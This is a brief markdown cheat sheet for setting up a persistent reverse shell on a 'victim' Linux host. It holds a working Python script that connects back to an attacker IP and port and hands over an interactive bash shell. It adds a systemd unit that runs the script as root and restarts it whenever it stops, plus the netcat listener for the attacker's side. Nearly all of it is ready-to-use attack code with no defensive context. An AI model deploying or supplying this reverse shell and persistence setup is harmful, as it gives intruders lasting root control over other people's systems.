## on victim
```
#!/usr/bin/python3
import socket
import subprocess
import os

# Attacker IP and port
HOST = '10.130.4.90'  # Replace with your attacker's IP address
PORT = 4444           # Replace with the port you want to listen on

# Create socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Try to connect to the attacker
s.connect((HOST, PORT))

# Redirect the I/O
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# Execute a shell
subprocess.call(["/bin/bash", "-i"])
```

```
chmod +x /path/to/reverse_shell.py
```

```
sudo vi /etc/systemd/system/python-reverse-shell.service
```

```
[Unit]
Description=Python Reverse Shell
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /path/to/reverse_shell.py
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
```

```
sudo systemctl daemon-reload
sudo systemctl start python-reverse-shell.service
sudo systemctl enable python-reverse-shell.service
```


## then on server side
```
nc -lvnp 4444
```
